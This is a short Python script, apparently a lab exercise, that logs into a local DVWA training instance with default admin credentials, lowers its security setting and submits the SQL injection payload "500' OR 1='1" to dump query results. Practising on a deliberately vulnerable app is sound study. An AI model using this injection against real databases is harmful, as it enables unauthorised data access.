import mechanize
import re
import requests

br=mechanize.Browser()
br.set_handle_robots(False)
#Login code
br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
print(br)
br.select_form(nr=0)
br["username"]='admin'
br["password"]='password'
sub=br.submit()
print(sub.geturl())
#Security low code
br.open("http://localhost/DVWA-master/security.php")
br.select_form(nr=0)
br["security"] = ["low"]
sub = br.submit()
#print(sub.read())
print(sub.geturl())
#Cookies
cookies = br._ua_handlers['_cookies'].cookiejar
# convert cookies into a dict usable by requests
cookie_dict = {}
for c in cookies:
    if c.name == 'security':
        c.value = 'low'
    else:
        cookie_dict[c.name] = c.value
# make a request
print(cookie_dict)

#print(r)
#sql injection code
br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
br.select_form(nr=0)
br["id"]="500' OR 1='1"
sub=br.submit()
print(sub.geturl())
content = sub.read().decode("utf-8")
#print(content)
beg = [m.start() for m in re.finditer('<pre>',content)]
end = [m.start() for m in re.finditer('</pre>',content)]
print(beg,end)
for i in range(len(beg)):
    print(content[beg[i]:end[i]])
